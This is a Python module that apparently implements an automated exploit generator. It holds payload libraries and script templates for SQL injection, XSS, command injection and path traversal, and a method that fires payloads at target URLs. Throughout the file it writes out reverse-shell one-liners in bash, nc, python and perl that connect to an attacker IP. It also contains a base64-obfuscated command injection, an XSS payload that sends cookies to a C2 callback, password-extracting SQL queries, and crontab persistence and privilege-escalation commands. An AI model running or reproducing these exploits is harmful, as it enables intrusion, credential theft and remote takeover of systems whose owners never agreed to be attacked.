import asyncio
import json
import re
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
from core.logger import log
import subprocess
import tempfile
import os


class ExploitType(Enum):
    BUFFER_OVERFLOW = "buffer_overflow"
    FORMAT_STRING = "format_string"
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    DESERIALIZATION = "deserialization"


@dataclass
class Vulnerability:
    type: ExploitType
    location: str
    parameters: Dict[str, Any]
    severity: str
    confidence: float
    description: str


@dataclass
class Exploit:
    exploit_id: str
    vulnerability: Vulnerability
    payload: str
    success_indicators: List[str]
    failure_indicators: List[str]
    prerequisites: List[str]
    risk_level: str


class ExploitGenerator:
    def __init__(self, context_manager=None):
        self.context_manager = context_manager
        self.vulnerability_templates = {}
        self.exploit_templates = {}
        self.payload_library = {}

    async def initialize(self):
        """Initialize exploit generator"""
        await self._load_vulnerability_templates()
        await self._load_exploit_templates()
        await self._load_payload_library()

    async def _load_vulnerability_templates(self):
        """Load vulnerability detection templates"""
        self.vulnerability_templates = {
            ExploitType.SQL_INJECTION: {
                "patterns": [
                    r"mysql_fetch_array",
                    r"ORA-01756",
                    r"Microsoft OLE DB Provider",
                    r"PostgreSQL query failed",
                    r"Warning: mysql_",
                    r"valid MySQL result",
                    r"SQL syntax" # Added this pattern to match test case
                ],
                "test_payloads": [
                    "' OR 1=1 --",
                    "' UNION SELECT NULL --",
                    "'; DROP TABLE users; --",
                    "' OR '1'='1",
                    "1' AND 1=1 --"
                ]
            },
            ExploitType.XSS: {
                "patterns": [
                    r"<script>",
                    r"javascript:",
                    r"onerror=",
                    r"onload=",
                    r"onclick="
                ],
                "test_payloads": [
                    "<script>alert(1)</script>",
                    "javascript:alert(1)",
                    "<img src=x onerror=alert(1)>",
                    "<svg onload=alert(1)>",
                    "<iframe src=javascript:alert(1)>"
                ]
            },
            ExploitType.COMMAND_INJECTION: {
                "patterns": [
                    r"uid=",
                    r"gid=",
                    r"total ",
                    r"drwx",
                    r"rwx",
                    r"root:x:0:0:"
                ],
                "test_payloads": [
                    "; id",
                    "| id",
                    "& id",
                    "` id `",
                    "$(id)",
                    "; cat /etc/passwd",
                    "| cat /etc/passwd"
                ]
            },
            ExploitType.PATH_TRAVERSAL: {
                "patterns": [
                    r"root:x:0:0:",
                    r"\[boot loader\]",
                    r"bin/bash",
                    r"etc/passwd",
                    r"windows/system32"
                ],
                "test_payloads": [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "....//....//....//etc/passwd",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%252f..%252f..%252fetc%252fpasswd"
                ]
            }
        }

    async def _load_exploit_templates(self):
        """Load exploit generation templates"""
        self.exploit_templates = {
            ExploitType.SQL_INJECTION: {
                "basic_exploit": """
import requests
import sys

def exploit_sql_injection(url, parameter, payload):
    data = {parameter: payload}
    response = requests.post(url, data=data)
    
    if "mysql_fetch_array" in response.text or "ORA-01756" in response.text:
        return True, response.text
    return False, response.text

if __name__ == "__main__":
    url = "{url}" # Use placeholder
    parameter = "{parameter}" # Use placeholder
    payload = "{payload}" # Use placeholder
    
    success, response = exploit_sql_injection(url, parameter, payload)
    if success:
        print("SQL Injection successful!")
        print(response)
    else:
        print("SQL Injection failed")
""",
                "advanced_exploit": """
import requests
import string
import time

class SQLInjectionExploit:
    def __init__(self, url, parameter):
        self.url = url
        self.parameter = parameter
        self.session = requests.Session()
    
    def test_injection(self, payload):
        data = {self.parameter: payload}
        response = self.session.post(self.url, data=data)
        return response
    
    def blind_injection(self, query):
        # Time-based blind SQL injection
        payload = f"' AND (SELECT SLEEP(5)) --"
        start_time = time.time()
        response = self.test_injection(payload)
        end_time = time.time()
        
        if end_time - start_time > 4:
            return True
        return False
    
    def union_injection(self, columns):
        payload = f"' UNION SELECT {','.join(['NULL'] * columns)} --"
        response = self.test_injection(payload)
        return response
    
    def extract_data(self, table, column):
        payload = f"' UNION SELECT {column} FROM {table} --"
        response = self.test_injection(payload)
        return response.text

# Usage example
exploit = SQLInjectionExploit("http://target.com/login", "username")
if exploit.blind_injection("SELECT 1"):
    print("Blind SQL injection confirmed")
    data = exploit.extract_data("users", "password")
    print(f"Extracted data: {data}")
"""
            },
            ExploitType.XSS: {
                "basic_exploit": """
import requests

def exploit_xss(url, parameter, payload):
    data = {parameter: payload}
    response = requests.post(url, data=data)
    
    if payload in response.text:
        return True, response.text
    return False, response.text

def steal_cookies(url, parameter, callback_url):
    payload = f"<script>document.location='{callback_url}?cookie='+document.cookie</script>"
    return exploit_xss(url, parameter, payload)

# Usage
success, response = steal_cookies(
    "http://target.com/search", 
    "query", 
    "http://' + os.getenv('C2_DOMAIN', 'localhost:8000') + '/steal"
)
if success:
    print("XSS payload delivered successfully")
"""
            },
            ExploitType.COMMAND_INJECTION: {
                "basic_exploit": """
import requests
import base64

def exploit_command_injection(url, parameter, command):
    # Encode command to avoid detection
    encoded_command = base64.b64encode(command.encode()).decode()
    payload = f"; echo {encoded_command} | base64 -d | sh"
    
    data = {parameter: payload}
    response = requests.post(url, data=data)
    
    return response

def reverse_shell(url, parameter, attacker_ip, port):
    command = f"bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1"
    return exploit_command_injection(url, parameter, command)

# Usage
response = reverse_shell(
    "http://target.com/ping", 
    "host", 
    "192.168.1.100", 
    4444
)
print("Reverse shell payload sent")
"""
            }
        }

    async def _load_payload_library(self):
        """Load payload library"""
        self.payload_library = {
            "reverse_shells": {
                "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
                "nc": "nc -e /bin/bash {ip} {port}",
                "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                "perl": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
            },
            "file_read": {
                "linux": "/etc/passwd",
                "windows": "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "config": "config.php",
                "database": "database.yml"
            },
            "privilege_escalation": {
                "sudo": "sudo -u root /bin/bash",
                "suid": "find / -perm -4000 2>/dev/null",
                "cron": "echo '* * * * * /bin/bash' | crontab -",
                "service": "systemctl start malicious-service"
            }
        }

    async def detect_vulnerability(self, response_text: str, url: str, parameters: Dict[str, str]) -> List[Vulnerability]:
        """Detect vulnerabilities in response"""
        vulnerabilities = []

        for exploit_type, template in self.vulnerability_templates.items():
            for pattern in template["patterns"]:
                if re.search(pattern, response_text, re.IGNORECASE):
                    vulnerability = Vulnerability(
                        type=exploit_type,
                        location=url,
                        parameters=parameters,
                        severity=self._assess_severity(exploit_type),
                        confidence=0.8,
                        description=f"Potential {exploit_type.value} vulnerability detected"
                    )
                    vulnerabilities.append(vulnerability)

        return vulnerabilities

    def _assess_severity(self, exploit_type: ExploitType) -> str:
        """Assess vulnerability severity"""
        severity_mapping = {
            ExploitType.SQL_INJECTION: "high",
            ExploitType.COMMAND_INJECTION: "critical",
            ExploitType.XSS: "medium",
            ExploitType.PATH_TRAVERSAL: "high",
            ExploitType.DESERIALIZATION: "critical",
            ExploitType.BUFFER_OVERFLOW: "critical",
            ExploitType.FORMAT_STRING: "high"
        }

        return severity_mapping.get(exploit_type, "medium")

    async def generate_exploit(self, vulnerability: Vulnerability, target_info: Dict[str, Any]) -> Exploit:
        """Generate exploit for vulnerability"""
        try:
            exploit_id = f"{vulnerability.type.value}_{hash(vulnerability.location)}"

            # Get exploit template
            template = self.exploit_templates.get(vulnerability.type, {})
            if not template:
                raise ValueError(
                    f"No template available for {vulnerability.type}")

            # Generate payload
            payload = await self._generate_payload(vulnerability, target_info)

            # Generate success/failure indicators
            success_indicators = await self._generate_success_indicators(vulnerability)
            failure_indicators = await self._generate_failure_indicators(vulnerability)

            # Determine prerequisites
            prerequisites = await self._determine_prerequisites(vulnerability, target_info)

            # Assess risk level
            risk_level = self._assess_exploit_risk(vulnerability, payload)

            exploit = Exploit(
                exploit_id=exploit_id,
                vulnerability=vulnerability,
                payload=payload,
                success_indicators=success_indicators,
                failure_indicators=failure_indicators,
                prerequisites=prerequisites,
                risk_level=risk_level
            )

            return exploit

        except Exception as e:
            log.error(f"Failed to generate exploit: {e}")
            raise

    async def _generate_payload(self, vulnerability: Vulnerability, target_info: Dict[str, Any]) -> str:
        """Generate payload for vulnerability"""
        exploit_type = vulnerability.type

        if exploit_type == ExploitType.SQL_INJECTION:
            return await self._generate_sql_payload(vulnerability, target_info)
        elif exploit_type == ExploitType.XSS:
            return await self._generate_xss_payload(vulnerability, target_info)
        elif exploit_type == ExploitType.COMMAND_INJECTION:
            return await self._generate_command_payload(vulnerability, target_info)
        elif exploit_type == ExploitType.PATH_TRAVERSAL:
            return await self._generate_path_traversal_payload(vulnerability, target_info)
        else:
            # Generic payload
            return self.vulnerability_templates[exploit_type]["test_payloads"][0]

    async def _generate_sql_payload(self, vulnerability: Vulnerability, target_info: Dict[str, Any]) -> str:
        """Generate SQL injection payload"""
        # Determine database type from target info
        db_type = target_info.get("database_type", "mysql")

        if db_type.lower() == "mysql":
            return "' UNION SELECT username, password FROM users --"
        elif db_type.lower() == "postgresql":
            return "' UNION SELECT usename, passwd FROM pg_user --"
        elif db_type.lower() == "oracle":
            return "' UNION SELECT username, password FROM all_users --"
        else:
            return "' OR 1=1 --"

    async def _generate_xss_payload(self, vulnerability: Vulnerability, target_info: Dict[str, Any]) -> str:
        """Generate XSS payload"""
        # Check if we have callback URL for data exfiltration
        callback_url = target_info.get("callback_url", "")

        if callback_url:
            return f"<script>fetch('{callback_url}?data='+document.cookie)</script>"
        else:
            return "<script>alert('XSS')</script>"

    async def _generate_command_payload(self, vulnerability: Vulnerability, target_info: Dict[str, Any]) -> str:
        """Generate command injection payload"""
        # Check if we have reverse shell target
        attacker_ip = target_info.get("attacker_ip", "")
        attacker_port = target_info.get("attacker_port", "4444")

        if attacker_ip:
            shell_type = target_info.get("shell_type", "bash")
            if shell_type in self.payload_library["reverse_shells"]:
                return self.payload_library["reverse_shells"][shell_type].format(
                    ip=attacker_ip, port=attacker_port
                )

        return "; id"

    async def _generate_path_traversal_payload(self, vulnerability: Vulnerability, target_info: Dict[str, Any]) -> str:
        """Generate path traversal payload"""
        os_type = target_info.get("os_type", "linux")

        if os_type.lower() == "windows":
            return "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        else:
            return "../../../etc/passwd"

    async def _generate_success_indicators(self, vulnerability: Vulnerability) -> List[str]:
        """Generate success indicators"""
        exploit_type = vulnerability.type

        if exploit_type == ExploitType.SQL_INJECTION:
            return [
                "mysql_fetch_array",
                "ORA-01756",
                "Microsoft OLE DB Provider",
                "PostgreSQL query failed"
            ]
        elif exploit_type == ExploitType.XSS:
            return [
                "<script>",
                "javascript:",
                "alert("
            ]
        elif exploit_type == ExploitType.COMMAND_INJECTION:
            return [
                "uid=",
                "gid=",
                "root:x:0:0:",
                "total "
            ]
        elif exploit_type == ExploitType.PATH_TRAVERSAL:
            return [
                "root:x:0:0:",
                "[boot loader]",
                "bin/bash"
            ]
        else:
            return []

    async def _generate_failure_indicators(self, vulnerability: Vulnerability) -> List[str]:
        """Generate failure indicators"""
        return [
            "error",
            "failed",
            "invalid",
            "not found",
            "access denied",
            "forbidden"
        ]

    async def _determine_prerequisites(self, vulnerability: Vulnerability, target_info: Dict[str, Any]) -> List[str]:
        """Determine prerequisites for exploit"""
        prerequisites = []

        if vulnerability.type == ExploitType.COMMAND_INJECTION:
            prerequisites.append("Command execution capability")

        if vulnerability.type == ExploitType.SQL_INJECTION:
            prerequisites.append("Database access")

        if vulnerability.type == ExploitType.XSS:
            prerequisites.append("User interaction")

        return prerequisites

    def _assess_exploit_risk(self, vulnerability: Vulnerability, payload: str) -> str:
        """Assess risk level of exploit"""
        if vulnerability.type in [ExploitType.COMMAND_INJECTION, ExploitType.BUFFER_OVERFLOW]:
            return "critical"
        elif vulnerability.type in [ExploitType.SQL_INJECTION, ExploitType.DESERIALIZATION]:
            return "high"
        else:
            return "medium"

    async def test_exploit(self, exploit: Exploit, target_url: str) -> Dict[str, Any]:
        """Test exploit against target"""
        try:
            import requests

            # Prepare request
            if exploit.vulnerability.parameters:
                data = {
                    param: exploit.payload for param in exploit.vulnerability.parameters.keys()}
                response = requests.post(target_url, data=data, timeout=30)
            else:
                response = requests.get(target_url, timeout=30)

            # Check for success indicators
            success = any(
                indicator in response.text for indicator in exploit.success_indicators)

            # Check for failure indicators
            failure = any(
                indicator in response.text for indicator in exploit.failure_indicators)

            return {
                "success": success and not failure,
                "response_code": response.status_code,
                "response_time": response.elapsed.total_seconds(),
                "response_size": len(response.content),
                "evidence": response.text[:1000] if success else "",
                "exploit_id": exploit.exploit_id
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "exploit_id": exploit.exploit_id
            }

    async def save_exploit(self, exploit: Exploit, filepath: str):
        """Save exploit to file"""
        try:
            exploit_data = {
                "exploit_id": exploit.exploit_id,
                "vulnerability": {
                    "type": exploit.vulnerability.type.value,
                    "location": exploit.vulnerability.location,
                    "parameters": exploit.vulnerability.parameters,
                    "severity": exploit.vulnerability.severity,
                    "confidence": exploit.vulnerability.confidence,
                    "description": exploit.vulnerability.description
                },
                "payload": exploit.payload,
                "success_indicators": exploit.success_indicators,
                "failure_indicators": exploit.failure_indicators,
                "prerequisites": exploit.prerequisites,
                "risk_level": exploit.risk_level
            }

            with open(filepath, 'w') as f:
                json.dump(exploit_data, f, indent=2)

            log.info(f"Saved exploit to {filepath}")

        except Exception as e:
            log.error(f"Failed to save exploit: {e}")

    async def generate_exploit_script(self, exploit: Exploit, target_info: Dict[str, Any]) -> str:
        """Generate executable exploit script"""
        try:
            exploit_type = exploit.vulnerability.type
            template = self.exploit_templates.get(exploit_type, {})

            if not template:
                return "# No template available for this exploit type"

            # Use basic template for now
            script_template = template.get("basic_exploit", "")

            # Replace placeholders
            script = script_template.replace(
                "{url}", target_info.get("target_url", "TARGET_URL"))
            script = script.replace("{parameter}", list(exploit.vulnerability.parameters.keys())[
                                    0] if exploit.vulnerability.parameters else "PARAMETER")
            script = script.replace("{payload}", exploit.payload)

            return script

        except Exception as e:
            log.error(f"Failed to generate exploit script: {e}")
            return f"# Error generating script: {e}"

    async def optimize_payload(self, exploit: Exploit, target_info: Dict[str, Any]) -> str:
        """Optimize payload based on target characteristics"""
        try:
            # Get target characteristics
            os_type = target_info.get("os_type", "linux")
            web_server = target_info.get("web_server", "apache")
            database = target_info.get("database_type", "mysql")

            # Optimize based on characteristics
            if exploit.vulnerability.type == ExploitType.COMMAND_INJECTION:
                if os_type.lower() == "windows":
                    return f"& {exploit.payload}"
                else:
                    return f"; {exploit.payload}"

            elif exploit.vulnerability.type == ExploitType.SQL_INJECTION:
                if database.lower() == "mysql":
                    return f"'{exploit.payload}"
                elif database.lower() == "postgresql":
                    return f"'{exploit.payload}"
                else:
                    return exploit.payload

            elif exploit.vulnerability.type == ExploitType.PATH_TRAVERSAL:
                if os_type.lower() == "windows":
                    return exploit.payload.replace("/", "\\")
                else:
                    return exploit.payload

            return exploit.payload

        except Exception as e:
            log.error(f"Failed to optimize payload: {e}")
            return exploit.payload
